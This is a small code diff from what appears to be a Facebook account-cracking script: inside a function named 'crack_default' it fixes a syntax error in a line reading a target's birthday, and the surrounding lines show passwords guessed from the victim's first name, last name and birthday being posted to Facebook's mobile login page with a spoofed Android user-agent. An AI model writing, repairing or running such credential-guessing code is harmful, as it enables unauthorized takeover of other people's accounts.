@@ -162,7 +162,7 @@ def crack_default(arg):
         v = json.loads(an.text)
         dp = v['first_name'].lower()
         bk = v['last_name'].lower()
-        bt = v]'birthday']
+        bt = v['birthday']
         pw = dp
         rex = requests.post("https://touch.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
         xo = rex.content
